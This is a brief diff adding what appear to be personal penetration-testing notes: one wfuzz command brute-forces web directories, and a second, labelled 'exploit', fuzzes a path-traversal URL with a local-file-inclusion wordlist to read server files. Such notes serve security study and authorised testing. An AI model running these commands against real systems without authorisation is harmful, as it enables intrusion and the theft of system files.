@@ -1,0 +1,19 @@
+Intial app assessment:
+ 
+ 
+ wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt https://offsec.io/23/FUZZ
+ 
+ we will analyze 404 response size
+
+we can fuzz all the endpoints same way
+
+we have to fuzz web root / & different endpoint
+
+
+
+exploit:
+
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 https://offsec.io/fontawesome/../../../../../../../FUZZ
+ 
+ 
+ this makes new vulnerablity
